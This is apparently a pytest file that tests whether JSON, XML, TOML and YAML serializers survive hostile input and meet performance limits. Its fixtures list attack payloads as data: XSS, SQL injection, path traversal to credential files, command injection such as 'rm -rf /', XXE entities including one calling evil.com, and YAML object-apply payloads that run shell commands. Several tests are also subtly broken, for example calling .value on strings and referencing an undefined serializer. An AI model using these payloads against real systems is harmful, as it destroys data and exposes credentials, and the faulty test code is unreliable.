#exonware/xwsystem/tests/1.unit/serialization_tests/test_serialization_security_performance.py
"""
Advanced security and performance tests for serialization formats.
Tests security vulnerabilities, performance limits, and production readiness.

Company: eXonware.com
Author: Eng. Muhammad AlShehri
Email: connect@exonware.com
Version: 0.0.1
Generation Date: 07-Sep-2025
"""

import pytest
import sys
import os
import time
import threading
import psutil
import gc
from pathlib import Path
from decimal import Decimal
from datetime import datetime, date, time as dt_time
from uuid import UUID
import io
import tempfile
import json
import xml.etree.ElementTree as ET

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'src'))

from exonware.xwsystem.io.serialization import JsonSerializer, XmlSerializer, TomlSerializer, YamlSerializer
from exonware.xwsystem.io.serialization.errors import SerializationError, FormatDetectionError, ValidationError


class TestSerializationSecurityPerformance:
    """Advanced security and performance tests for serialization formats."""
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test environment."""
        self.serializers = {
            "json": JsonSerializer(),
            "xml": XmlSerializer(),
            "toml": TomlSerializer(),
            "yaml": YamlSerializer()
        }
        
        # Security test data
        self.security_payloads = {
            'xss_attempts': [
                '<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            ],
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' UNION SELECT * FROM users --",
                "'; UPDATE users SET password='hacked'; --",
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                '....//....//....//etc//passwd',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam',
            ],
            'command_injection': [
                '; rm -rf /',
                '| del /s /q C:\\',
                '&& format C: /q',
                '; cat /etc/passwd',
                '| type C:\\windows\\system32\\drivers\\etc\\hosts',
                '$(rm -rf /)',
                '`rm -rf /`',
            ],
            'xml_attacks': [
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><test>&xxe;</test>',
            ],
            'yaml_attacks': [
                '!!python/object/apply:os.system ["rm -rf /"]',
                '!!python/object/apply:subprocess.call ["rm", "-rf", "/"]',
                '!!python/object/apply:eval ["__import__(\'os\').system(\'rm -rf /\')"]',
                '!!python/object/apply:exec ["import os; os.system(\'rm -rf /\')"]',
            ],
        }
        
        # Performance test data
        self.performance_data = {
            'small': {'items': list(range(100))},
            'medium': {'items': list(range(10000))},
            'large': {'items': list(range(100000))},
            'huge': {'items': list(range(1000000))},
        }
    
    # =============================================================================
    # SECURITY TESTS
    # =============================================================================
    
    def test_xss_protection(self):
        """Test XSS attack protection - serializers should handle malicious content safely."""
        for xss_payload in self.security_payloads['xss_attempts']:
            test_data = {'content': xss_payload, 'safe': 'normal data'}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    # Serialize should work (data is just data)
                    serialized = self.serializers[format_type].dumps_text(test_data)
                    assert len(serialized) > 0
                    
                    # Deserialize should work - serializers don't sanitize, they just serialize
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    assert isinstance(deserialized, dict)
                    assert 'content' in deserialized
                    
                    # Content should be preserved as-is (serializers don't sanitize)
                    content = deserialized['content']
                    assert isinstance(content, str)
                    
                    # The content should be exactly what was serialized
                    assert content == xss_payload
                    
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    
    def test_sql_injection_protection(self):
        """Test SQL injection protection."""
        for sql_payload in self.security_payloads['sql_injection']:
            test_data = {'query': sql_payload, 'user': 'normal_user'}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    # Serialize should work
                    serialized = self.serializers[format_type].dumps_text(test_data)
                    assert len(serialized) > 0
                    
                    # Deserialize should work
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    assert isinstance(deserialized, dict)
                    assert 'query' in deserialized
                    
                    # Content should be properly escaped
                    query = deserialized['query']
                    assert isinstance(query, str)
                    
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    
    def test_path_traversal_protection(self):
        """Test path traversal protection."""
        from exonware.xwsystem.io.serialization import XWSerializer
        
        for path_payload in self.security_payloads['path_traversal']:
            # Test file operations using XWSerializer
            xw_serializer = XWSerializer()
            with pytest.raises((SerializationError, ValueError, OSError, FileNotFoundError)):
                xw_serializer.load_file(path_payload)
            
            # Test data containing path traversal
            test_data = {'filename': path_payload, 'content': 'safe content'}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps_text(test_data)
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    
                    # Filename should be properly escaped or sanitized
                    filename = deserialized['filename']
                    assert isinstance(filename, str)
                    
                    # Should not contain unescaped path traversal sequences
                    if '../' in filename or '..\\' in filename:
                        assert '&lt;' in filename or '&amp;' in filename
                    
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    
    def test_command_injection_protection(self):
        """Test command injection protection."""
        for cmd_payload in self.security_payloads['command_injection']:
            test_data = {'command': cmd_payload, 'safe': 'normal data'}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps_text(test_data)
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    
                    # Command should be properly escaped
                    command = deserialized['command']
                    assert isinstance(command, str)
                    
                    # Should not contain unescaped command characters
                    if ';' in command or '|' in command or '&' in command:
                        assert '&amp;' in command or '&lt;' in command
                    
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    
    def test_xml_bomb_protection(self):
        """Test XML bomb protection."""
        for xml_bomb in self.security_payloads['xml_attacks']:
            try:
                result = self.serializers["xml"].loads_text(xml_bomb)
                # If it parses, it should be reasonable size
                assert len(str(result)) < 1000000
            except (SerializationError, ET.ParseError, MemoryError, RecursionError):
                # Expected for XML bombs
                pass
    
    def test_yaml_bomb_protection(self):
        """Test YAML bomb protection."""
        for yaml_bomb in self.security_payloads['yaml_attacks']:
            try:
                result = self.serializers["yaml"].loads_text(yaml_bomb)
                # If it parses, it should be reasonable size
                assert len(str(result)) < 1000000
            except (SerializationError, ValueError, MemoryError, RecursionError):
                # Expected for YAML bombs
                pass
    
    def test_entity_expansion_limits(self):
        """Test entity expansion limits."""
        # Test with progressively larger entity expansions
        for size in [100, 1000, 10000]:
            xml_with_entities = '<?xml version="1.0"?>' + \
                              '<!DOCTYPE test [' + \
                              '<!ENTITY a "' + 'x' * size + '">' + \
                              ']>' + \
                              '<test>&a;</test>'
            
            try:
                result = self.serializers["xml"].loads_text(xml_with_entities)
                # Should either parse safely or fail gracefully
                assert len(str(result)) < 1000000
            except (SerializationError, ET.ParseError, MemoryError):
                # Expected for large entities
                pass
    
    def test_deep_nesting_limits(self):
        """Test deep nesting limits."""
        # Test with progressively deeper nesting
        for depth in [100, 1000, 10000]:
            deep_data = self._create_deep_nesting(depth)
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps_text(deep_data)
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    # Should either work or fail gracefully
                    assert len(str(deserialized)) < 1000000
                except (SerializationError, ValueError, MemoryError, RecursionError):
                    # Expected for very deep nesting
                    pass
    
    def _create_deep_nesting(self, depth):
        """Create deeply nested data structure."""
        if depth == 0:
            return 'leaf'
        return {'level': depth, 'child': self._create_deep_nesting(depth - 1)}
    
    # =============================================================================
    # PERFORMANCE TESTS
    # =============================================================================
    
    def test_serialization_performance(self):
        """Test serialization performance benchmarks."""
        performance_results = {}
        
        for size_name, test_data in self.performance_data.items():
            size_results = {}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                
                # Warm up
                for _ in range(10):
                    self.serializers[format_type].dumps_text(test_data)
                
                # Benchmark serialization
                start_time = time.time()
                for _ in range(100):
                    serialized = self.serializers[format_type].dumps_text(test_data)
                serialize_time = (time.time() - start_time) / 100
                
                # Benchmark deserialization
                start_time = time.time()
                for _ in range(100):
                    deserialized = self.serializers[format_type].loads_text(serialized)
                deserialize_time = (time.time() - start_time) / 100
                
                size_results[format_type.value] = {
                    'serialize_time': serialize_time,
                    'deserialize_time': deserialize_time,
                    'size': len(serialized)
                }
            
            performance_results[size_name] = size_results
        
        # Performance assertions
        for size_name, results in performance_results.items():
            for format_type, metrics in results.items():
                # Serialization should be fast
                assert metrics['serialize_time'] < 1.0, f"{format_type} serialization too slow: {metrics['serialize_time']:.3f}s"
                # Deserialization should be fast
                assert metrics['deserialize_time'] < 1.0, f"{format_type} deserialization too slow: {metrics['deserialize_time']:.3f}s"
                # Size should be reasonable
                assert metrics['size'] > 0, f"{format_type} produced empty result"
    
    def test_memory_usage_performance(self):
        """Test memory usage performance."""
        import gc
        
        # Get initial memory usage
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform many operations
        test_data = self.performance_data['large']
        
        for i in range(1000):
            for format_type in ["json", "xml", "toml", "yaml"]:
                serialized = self.serializers[format_type].dumps_text(test_data)
                deserialized = self.serializers[format_type].loads_text(serialized)
                
                # Force garbage collection every 100 iterations
                if i % 100 == 0:
                    gc.collect()
        
        # Get final memory usage
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 200MB)
        assert memory_increase < 200 * 1024 * 1024, f"Memory usage too high: {memory_increase / 1024 / 1024:.2f}MB increase"
    
    def test_concurrent_performance(self):
        """Test concurrent access performance."""
        results = []
        errors = []
        
        def performance_worker(data, format_type, worker_id, iterations=100):
            try:
                start_time = time.time()
                
                for i in range(iterations):
                    serialized = self.serializers[format_type].dumps_text(data)
                    deserialized = self.serializers[format_type].loads_text(serialized)
                
                end_time = time.time()
                results.append((worker_id, format_type.value, end_time - start_time, iterations))
                
            except Exception as e:
                errors.append((worker_id, format_type.value, str(e)))
        
        # Create multiple threads
        threads = []
        test_data = self.performance_data['medium']
        
        for i in range(20):  # 20 concurrent workers
            for format_type in ["json", "xml", "toml", "yaml"]:
                thread = threading.Thread(target=performance_worker, args=(test_data, format_type, i))
                threads.append(thread)
                thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Check results
        assert len(errors) == 0, f"Concurrent performance errors: {errors}"
        assert len(results) > 0, "No results from concurrent workers"
        
        # Calculate average performance
        format_performance = {}
        for worker_id, format_type, duration, iterations in results:
            if format_type not in format_performance:
                format_performance[format_type] = []
            format_performance[format_type].append(duration / iterations)
        
        # Performance should be reasonable under concurrent load
        for format_type, times in format_performance.items():
            avg_time = sum(times) / len(times)
            assert avg_time < 0.1, f"{format_type} concurrent performance too slow: {avg_time:.3f}s per operation"
    
    def test_large_file_performance(self):
        """Test large file performance."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            # Create large test data
            large_data = {
                'items': [{'id': i, 'data': f'item_{i}' * 100} for i in range(10000)],
                'metadata': {'created': datetime.now().isoformat(), 'version': '1.0.0'}
            }
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                
                file_path = temp_path / f'test.{format_type.value}'
                
                # Test file writing performance
                start_time = time.time()
                self.serializer.dump_file(large_data, file_path)
                write_time = time.time() - start_time
                
                # Test file reading performance
                start_time = time.time()
                loaded_data = self.serializers["json"].load_file(file_path)
                read_time = time.time() - start_time
                
                # Performance assertions
                assert write_time < 5.0, f"{format_type} file write too slow: {write_time:.3f}s"
                assert read_time < 5.0, f"{format_type} file read too slow: {read_time:.3f}s"
                
                # Data integrity
                assert len(loaded_data['items']) == 10000
                assert loaded_data['metadata']['version'] == '1.0.0'
    
    def test_streaming_performance(self):
        """Test streaming performance."""
        # Create large dataset for streaming
        large_dataset = [{'id': i, 'data': f'item_{i}' * 100} for i in range(10000)]
        
        for format_type in ["json", "xml", 
                           "toml", "yaml"]:
            
            try:
                # Test streaming serialization
                start_time = time.time()
                chunks = list(self.serializers[format_type].iter_serialize(large_dataset, chunk_size=1024))
                serialize_time = time.time() - start_time
                
                # Test streaming deserialization
                start_time = time.time()
                deserialized_items = list(self.serializer.iter_deserialize(chunks))
                deserialize_time = time.time() - start_time
                
                # Performance assertions
                assert serialize_time < 10.0, f"{format_type} streaming serialize too slow: {serialize_time:.3f}s"
                assert deserialize_time < 10.0, f"{format_type} streaming deserialize too slow: {deserialize_time:.3f}s"
                
                # Data integrity
                assert len(deserialized_items) > 0
                
            except (SerializationError, NotImplementedError):
                # Some formats might not support streaming
                pass
    
    # =============================================================================
    # STRESS TESTS
    # =============================================================================
    
    def test_extreme_data_sizes(self):
        """Test extreme data sizes."""
        # Test with very large datasets
        extreme_sizes = [100000, 500000, 1000000]
        
        for size in extreme_sizes:
            extreme_data = {'items': list(range(size))}
            
            for format_type in ["json", "xml", "toml", "yaml"]:
                
                try:
                    # Test serialization
                    start_time = time.time()
                    serialized = self.serializers[format_type].dumps_text(extreme_data)
                    serialize_time = time.time() - start_time
                    
                    # Test deserialization
                    start_time = time.time()
                    deserialized = self.serializers[format_type].loads_text(serialized)
                    deserialize_time = time.time() - start_time
                    
                    # Performance should be reasonable even for extreme sizes
                    assert serialize_time < 30.0, f"{format_type} extreme serialize too slow: {serialize_time:.3f}s for {size} items"
                    assert deserialize_time < 30.0, f"{format_type} extreme deserialize too slow: {deserialize_time:.3f}s for {size} items"
                    
                    # Data integrity
                    assert len(deserialized['items']) == size
                    
                except (SerializationError, MemoryError):
                    # Some formats might not handle extreme sizes
                    pass
    
    def test_rapid_operations(self):
        """Test rapid operations performance."""
        test_data = self.performance_data['medium']
        
        for format_type in ["json", "xml", 
                           "toml", "yaml"]:
            
            # Test rapid serialization/deserialization cycles
            start_time = time.time()
            
            for i in range(1000):
                serialized = self.serializers[format_type].dumps_text(test_data)
                deserialized = self.serializers[format_type].loads_text(serialized)
                
                # Add small delay to prevent overwhelming
                if i % 100 == 0:
                    time.sleep(0.001)
            
            total_time = time.time() - start_time
            
            # Should complete 1000 operations in reasonable time
            assert total_time < 60.0, f"{format_type} rapid operations too slow: {total_time:.3f}s for 1000 operations"
    
    def test_mixed_workload_performance(self):
        """Test mixed workload performance."""
        # Mix of different data sizes and types
        mixed_workloads = [
            {'type': 'small', 'data': self.performance_data['small'], 'count': 1000},
            {'type': 'medium', 'data': self.performance_data['medium'], 'count': 100},
            {'type': 'large', 'data': self.performance_data['large'], 'count': 10},
        ]
        
        for format_type in ["json", "xml", 
                           "toml", "yaml"]:
            
            start_time = time.time()
            
            for workload in mixed_workloads:
                for i in range(workload['count']):
                    serialized = self.serializers[format_type].dumps_text(workload['data'])
                    deserialized = self.serializers[format_type].loads_text(serialized)
            
            total_time = time.time() - start_time
            
            # Should complete mixed workload in reasonable time
            assert total_time < 120.0, f"{format_type} mixed workload too slow: {total_time:.3f}s"
    
    # =============================================================================
    # PRODUCTION READINESS TESTS
    # =============================================================================
    
    def test_production_data_handling(self):
        """Test production-like data handling."""
        # Simulate real-world production data
        production_data = {
            'users': [
                {
                    'id': i,
                    'name': f'User {i}',
                    'email': f'user{i}@example.com',
                    'profile': {
                        'age': 20 + (i % 50),
                        'location': f'City {i % 100}',
                        'preferences': {
                            'theme': 'dark' if i % 2 == 0 else 'light',
                            'notifications': True,
                            'language': 'en'
                        }
                    },
                    'created_at': datetime.now().isoformat(),
                    'updated_at': datetime.now().isoformat(),
                    'active': i % 10 != 0
                }
                for i in range(10000)
            ],
            'metadata': {
                'total_users': 10000,
                'active_users': 9000,
                'created_at': datetime.now().isoformat(),
                'version': '1.0.0',
                'environment': 'production'
            }
        }
        
        for format_type in ["json", "xml", 
                           "toml", "yaml"]:
            
            # Test full serialization cycle
            start_time = time.time()
            serialized = self.serializers[format_type].dumps_text(production_data)
            serialize_time = time.time() - start_time
            
            start_time = time.time()
            deserialized = self.serializers[format_type].loads_text(serialized)
            deserialize_time = time.time() - start_time
            
            # Performance should be production-ready
            assert serialize_time < 5.0, f"{format_type} production serialize too slow: {serialize_time:.3f}s"
            assert deserialize_time < 5.0, f"{format_type} production deserialize too slow: {deserialize_time:.3f}s"
            
            # Data integrity
            assert len(deserialized['users']) == 10000
            assert deserialized['metadata']['total_users'] == 10000
            assert deserialized['metadata']['active_users'] == 9000
            
            # Test all features with production data
            try:
                # Format detection
                detected = self.serializers[format_type].sniff_format(serialized)
                assert detected == format_type
                
                # Partial access
                first_user = self.serializers[format_type].get_at(serialized, "users.0.name")
                assert first_user == "User 0"
                
                # Schema validation
                schema = {"users": list, "metadata": dict}
                is_valid = self.serializers[format_type].validate_schema(serialized, schema)
                assert is_valid is True
                
                # Canonical serialization
                canonical = self.serializers[format_type].canonicalize(production_data)
                assert len(canonical) > 0
                
                # Checksums
                checksum = self.serializers[format_type].checksum(production_data)
                assert len(checksum) > 0
                
                is_valid = self.serializers[format_type].verify_checksum(production_data, checksum)
                assert is_valid is True
                
            except (SerializationError, NotImplementedError):
                # Some features might not be available
                pass
    
    def test_error_recovery(self):
        """Test error recovery and resilience."""
        # Test with various error conditions
        error_conditions = [
            {'data': None, 'expected': (SerializationError, ValueError, TypeError)},
            {'data': '', 'expected': (SerializationError, ValueError)},
            {'data': 'invalid', 'expected': (SerializationError, ValueError)},
            {'data': {'circular': None}, 'expected': (SerializationError, ValueError, TypeError)},
        ]
        
        # Create circular reference
        circular_data = {}
        circular_data['self'] = circular_data
        error_conditions[3]['data']['circular'] = circular_data
        
        for format_type in ["json", "xml", 
                           "toml", "yaml"]:
            
            for condition in error_conditions:
                try:
                    result = self.serializers[format_type].dumps_text(condition['data'])
                    # If it succeeds, that's also fine
                    assert len(result) >= 0
                except condition['expected']:
                    # Expected error
                    pass
                except Exception as e:
                    # Unexpected error type
                    pytest.fail(f"Unexpected error type: {type(e).__name__}: {e}")
    
    def test_resource_cleanup(self):
        """Test resource cleanup and memory management."""
        import gc
        
        # Get initial memory
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform many operations with large data
        large_data = self.performance_data['large']
        
        for i in range(100):
            for format_type in ["json", "xml", "toml", "yaml"]:
                serialized = self.serializers[format_type].dumps_text(large_data)
                deserialized = self.serializers[format_type].loads_text(serialized)
                
                # Force cleanup
                del serialized, deserialized
                gc.collect()
        
        # Get final memory
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory should be cleaned up properly
        assert memory_increase < 50 * 1024 * 1024, f"Resource cleanup failed: {memory_increase / 1024 / 1024:.2f}MB increase"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
